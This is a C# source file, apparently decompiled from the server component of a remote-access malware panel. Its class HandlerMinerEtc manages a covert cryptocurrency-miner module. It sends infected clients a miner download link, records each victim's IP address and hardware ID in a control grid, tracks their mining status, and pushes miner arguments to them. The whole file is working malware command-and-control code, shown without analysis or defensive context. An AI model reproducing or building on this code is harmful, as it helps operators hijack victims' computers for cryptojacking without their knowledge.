using System.Windows.Forms;
using Server.Connectings;

namespace Server.Messages;

internal class HandlerMinerEtc
{
	public static void Read(Clients clients, object[] array)
	{
		if (clients == null || array == null || array.Length < 2)
		{
			if (clients != null)
			{
				clients.Disconnect();
			}
			return;
		}
		switch ((string)array[1])
		{
		case "GetLink":
			clients.Send(new object[2]
			{
				"Link",
				Program.form.settings.linkMiner
			});
			break;
		case "Status":
			if (clients.Tag == null)
			{
				clients.Disconnect();
				break;
			}
			Program.form.MinerEtc.GridClients.Invoke((MethodInvoker)delegate
			{
				((DataGridViewRow)clients.Tag).Cells[2].Value = (string)array[2];
			});
			break;
		case "Connect":
			if (Program.form.MinerEtc.work)
			{
				clients.Hwid = (string)array[2];
				DataGridViewRow Item = new DataGridViewRow();
				Item.Tag = clients;
				Item.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = clients.IP
				});
				Item.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = clients.Hwid
				});
				Item.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = "dont mining"
				});
				Item.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = (string)array[3]
				});
				Item.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = (string)array[4]
				});
				clients.Tag = Item;
				Program.form.MinerEtc.Invoke((MethodInvoker)delegate
				{
					Program.form.MinerEtc.GridClients.Rows.Add(Item);
					if (Program.form.MinerEtc.materialSwitch7.Checked)
					{
						clients.Send(Program.form.MinerEtc.Args());
					}
				});
			}
			else
			{
				clients.Disconnect();
			}
			break;
		}
	}
}
